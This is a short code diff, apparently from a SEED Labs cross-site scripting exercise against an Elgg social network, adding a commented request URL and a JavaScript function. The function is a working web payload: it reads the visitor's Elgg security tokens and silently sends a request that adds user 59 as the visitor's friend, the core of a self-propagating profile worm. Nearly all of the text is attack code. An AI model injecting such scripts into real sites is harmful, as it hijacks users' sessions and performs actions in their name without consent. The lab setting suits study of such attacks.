@@ -1,0 +1,2 @@
+//http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1708021610&__elgg_token=tfNNyE2YLXd-DkP0QV4_uw&__elgg_ts=1708021610&__elgg_token=tfNNyE2YLXd-DkP0QV4_uw
+const script_1 = async () => { await fetch(`http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=${elgg.security.token.__elgg_ts}&__elgg_token=${elgg.security.token.__elgg_token}&__elgg_ts=${elgg.security.token.__elgg_ts}&__elgg_token=${elgg.security.token.__elgg_token}`); }
